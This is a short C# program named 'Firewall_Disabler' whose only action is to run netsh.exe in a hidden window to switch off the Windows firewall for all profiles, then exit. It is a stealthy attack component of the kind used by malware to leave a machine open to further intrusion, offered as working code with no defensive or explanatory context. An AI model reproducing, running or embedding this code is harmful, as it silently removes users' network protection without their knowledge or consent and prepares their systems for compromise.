using System;
using System.Diagnostics;

namespace Firewall_Disabler
{
    public class main
    {
        public static void Main()
        {
            ProcessStartInfo disable_firewall = new ProcessStartInfo();
            disable_firewall.FileName = @"netsh.exe";
            disable_firewall.Arguments = @"advfirewall set allprofiles state off";
            disable_firewall.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(disable_firewall);


            Environment.Exit(0);
        }
    }
}
